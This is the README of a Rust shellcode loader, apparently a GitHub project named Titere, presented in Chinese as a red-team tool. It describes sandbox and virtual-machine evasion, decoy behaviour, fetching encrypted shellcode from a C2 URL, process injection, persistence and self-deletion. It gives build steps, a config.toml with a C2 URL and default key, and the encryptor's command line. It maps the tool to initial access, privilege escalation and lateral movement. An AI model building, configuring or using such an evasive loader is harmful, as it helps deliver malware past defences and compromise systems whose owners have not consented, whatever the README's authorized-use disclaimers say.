# Titere - 高级Shellcode加载器

一个集成了多种高级反检测技术的 Rust Shellcode 加载器，专为红队渗透测试设计。

## 🎯 核心功能

### 主程序 (src/main.rs) - Shellcode加载器
- **沙箱对抗**：运行时间检测、用户交互检测、环境特征检测、进程检测、资源检测、虚拟机检测
- **行为伪装**：延迟执行、正常文件访问、多态垃圾代码、假解密操作
- **Shellcode加载**：远程下载、AES-GCM/XOR解密、多种进程注入技术
- **自清理**：执行后自删除、痕迹清理
- **持久化**：支持启动项持久化
- **配置系统**：通过config.toml灵活配置所有功能

### 加密工具 (encrypt_project/src/main.rs) - Shellcode加密器
- **Shellcode处理**：自动检测.bin文件或指定输入文件
- **多种加密**：支持AES-GCM和XOR加密
- **命令行界面**：灵活的参数配置

## 🛠️ 技术架构

### Shellcode加载流程
1. **配置加载** - 从config.toml加载配置参数
2. **沙箱检测** - 确保在真实环境中执行
3. **持久化创建** - 根据配置决定是否创建持久化
4. **行为伪装** - 混淆真实意图
5. **远程获取Shellcode** - 从C2服务器下载加密数据
6. **解密Shellcode** - 使用AES-GCM或XOR解密
7. **进程注入执行** - 使用多种技术注入目标进程并执行
8. **自清理** - 根据配置决定是否自删除

### 沙箱检测技术
- 系统运行时间检测（可配置阈值）
- 用户交互检测（可配置阈值）
- 环境特征检测（用户名、主机名）
- 沙箱进程检测（扩展的进程列表）
- 系统资源检测（内存、磁盘空间、CPU核心数）
- 虚拟机注册表检测

### 进程注入技术
- 标准CreateRemoteThread注入
- 分段写入内存注入
- 垃圾数据覆盖注入

## 🚀 快速开始

### 环境要求
- Windows 操作系统
- Rust 开发环境

### 编译安装
```bash
# 克隆项目
git clone https://github.com/9Insomnie/TitereV1.0.git
cd Titere

# 编译主程序
cargo build --release

# 编译加密工具
cd encrypt_project
cargo build --release
```

### 配置文件
项目根目录下的`config.toml`文件用于配置程序行为：

```toml
# 服务器配置
[server]
url = "https://example.com/payload"  # C2服务器URL
timeout = 30                        # 连接超时（秒）
retries = 3                         # 重试次数

# 加密配置
[encryption]
key = "1A2B3C4D5E6F7A8B"           # 加密密钥
algorithm = "aes-gcm"               # 加密算法: "aes-gcm" 或 "xor"

# 沙箱检测配置
[sandbox_detection]
enabled = true                      # 是否启用沙箱检测
# 其他沙箱检测相关配置...
```

### 加密工具使用

```bash
# 基本用法
./encrypt_project -i shellcode.bin -o output.bin -k 自定义密钥 -a aes-gcm

# 参数说明
-i, --input    输入文件路径
-o, --output   输出文件路径（默认：output.bin）
-k, --key      加密密钥（默认：1A2B3C4D5E6F7A8B）
-a, --algorithm 加密算法：aes-gcm 或 xor（默认：aes-gcm）
```

## ⚠️ 免责声明

本工具仅用于授权的安全测试和教育目的。使用本工具进行未授权的测试或攻击行为是违法的。使用者需要对自己的行为负全部责任。开发者不对任何滥用或非法使用本工具的行为负责。

### 使用方法

#### Shellcode加载器
```bash
# 直接运行
cargo run

# 或运行编译后的可执行文件
./target/release/loader.exe
```

#### Shellcode加密器
```bash
cd encrypt_project
cargo run
```

## 🔧 配置说明

### C2服务器配置
修改 `src/main.rs` 中的C2服务器地址：
```rust
let url = "http://your-c2-server.com:port/output.bin";
```

### 加密密钥
默认XOR密钥：`[0x1A, 0x2B, 0x3C, 0x4D, 0x5E, 0x6F, 0x7A, 0x8B]`

## 🎯 红队使用场景

1. **初始访问**：绕过沙箱检测，加载初始shellcode
2. **权限提升**：注入高权限进程，执行提权shellcode
3. **横向移动**：远程代码执行，进程间shellcode传播
4. **持久化**：隐蔽shellcode加载，维持访问

## 📊 技术细节

### 多态代码技术
- 模拟数学计算
- 模拟字符串处理
- 模拟数组操作
- 模拟时间获取

### 自删除技术
- 延迟3秒后删除自身文件
- 使用cmd命令执行删除操作

## ⚠️ 重要声明

**本工具仅用于授权的红队渗透测试。使用者必须获得目标系统的明确授权，并遵守相关法律法规。作者不承担任何因非法使用而产生的法律责任。**

## 📞 联系方式

- GitHub Issues: [@9Insomnie](https://github.com/9Insomnie)
- 个人主页: [9Insomnie](https://github.com/9Insomnie)

---

**⚠️ 再次提醒：请确保在授权环境中使用本工具，遵守相关法律法规。**
